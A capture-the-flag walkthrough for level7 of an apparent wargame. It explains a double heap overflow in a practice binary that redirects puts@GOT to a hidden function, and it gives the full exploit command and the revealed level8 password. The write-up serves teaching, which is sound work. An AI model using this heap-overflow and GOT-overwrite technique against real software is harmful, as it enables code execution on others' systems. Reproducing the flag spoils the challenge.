# Level 7 Walkthrough – Detailed Explanation

## 🎯 Goal
Exploit **dual heap buffer overflows** to hijack a pointer, overwrite a **GOT entry**, and reveal the password for level8.

---

## Step 1: What the Program Does

From the decompiled C code:

```c
int32_t* var1 = malloc(8);
*var1 = 1;
var1[1] = malloc(8);        // buffer1

int32_t* var2 = malloc(8);
*var2 = 2;
var2[1] = malloc(8);        // buffer2

strcpy(var1[1], argv[1]);   // Vulnerability 1
strcpy(var2[1], argv[2]);   // Vulnerability 2

fgets(&c, 0x44, fopen("/home/user/level8/.pass", "r"));
puts("~~");
```

**Explanation in simple terms:**

1. The program allocates **two small heap structs** (`var1` and `var2`) with **two fields each**:
   - `field1` stores a number.
   - `field2` points to another heap allocation (buffer for user input).  

2. It copies **user input** into these buffers using `strcpy()` **without checking length** → **heap overflow vulnerability**.  

3. The program then reads the password from a file into a global variable and prints a static message `"~~"`. Normally, the user never sees the password.

---

## Step 2: Understanding the Heap Layout

### Memory layout in order of allocation:

```
Heap:
[ buffer1 ] → 8 bytes (for argv[1])
[ var2 struct ] → 8 bytes (field1 + field2)
[ buffer2 ] → 8 bytes (for argv[2])
```

- **Distance from `buffer1` → `var2->field2` pointer**: ~20 bytes  
  - 8 bytes of `buffer1` + 8 bytes of `var2` struct + heap metadata/alignment → ~20 bytes  
  - This is **why overflowing `buffer1` by 20 bytes allows you to overwrite `var2->field2` pointer**.

- **Distance from `buffer2` pointer (`var2->field2`) → arbitrary memory**: Once we control `var2->field2`, we can write anywhere using the second strcpy.

---

## Step 3: The Vulnerability

### Dual Heap Overflow Steps:

1. **First `strcpy` (`buffer1`)**:
   - Overflows 8-byte buffer.
   - Overwrites `var2->field2` pointer (the pointer controlling `buffer2`).  

2. **Second `strcpy` (`buffer2`)**:
   - Writes to memory **where `var2->field2` points**, because we control it.
   - This allows us to overwrite **critical addresses**, like **GOT entries**.

---

## Step 4: Target – GOT Entry

- **GOT (Global Offset Table)** stores addresses of library functions.
- Overwriting a GOT entry allows **redirecting function calls**.

Example targets:

| Function | GOT Address | Purpose |
|----------|------------|---------|
| `puts`   | 0x8049928  | Overwrite to redirect execution |
| `fopen`  | 0x804993c  | Could also redirect |
| `m()`    | 0x80484f4  | Hidden function to print password |

---

## Step 5: Crafting the Exploit

**Strategy**:

1. Overflow `buffer1` to change `var2->field2` pointer → make it point to `puts@GOT`.  
2. Use `strcpy` on `buffer2` to **overwrite `puts@GOT`** → make it point to `m()` function.  
3. When program calls `puts()`, it will instead jump to `m()` → prints the password.  

**Command**:

```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') \
         $(python -c 'print "\xf4\x84\x04\x08"')
```

- `"A"*20` → fill padding up to `var2->field2`.
- `"\x28\x99\x04\x08"` → new pointer value → points to `puts@GOT`.
- `"\xf4\x84\x04\x08"` → overwrite `puts@GOT` → points to `m()`.

---

## Step 6: What Happens in Memory

**Before overflow:**

```
buffer1: [ .... ] 8 bytes
var2 struct: [ field1=2 | field2 → buffer2 ]
buffer2: [ .... ] 8 bytes
```

**After first overflow (buffer1):**

```
buffer1: [AAAAAAAAAAAAAAAAAAAA] (20 bytes)
var2->field2 pointer: overwritten → points to puts@GOT
```

**After second strcpy (buffer2):**

```
Memory at puts@GOT: overwritten → points to m()
```

**Program flow:**

- Program calls `puts()` → instead jumps to `m()`  
- `m()` prints the level8 password.

---

## Step 7: Why This Exploit Works

1. **Heap overflow** allows you to overwrite **adjacent heap structures**.  
2. **Pointer hijacking** → control where the second strcpy writes.  
3. **GOT overwrite** → redirect normal program execution.  
4. **Execution redirect** → when `puts()` is called, program jumps to your target function (`m()`).  
5. **Precision required**:
   - Correct **offset (20 bytes)** to reach pointer.
   - **Little-endian format** for addresses.

---

## Step 8: Result

```bash
level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') \
                        $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

- **Password revealed**: `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`  
- **Access level8**:

```bash
su level8
Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

---

## ✅ Summary (Simple Explanation)

- First buffer overflow → hijacks pointer.  
- Second buffer overflow → writes to controlled location (GOT).  
- GOT overwrite → function call is redirected.  
- Password printed → arbitrary code execution achieved.
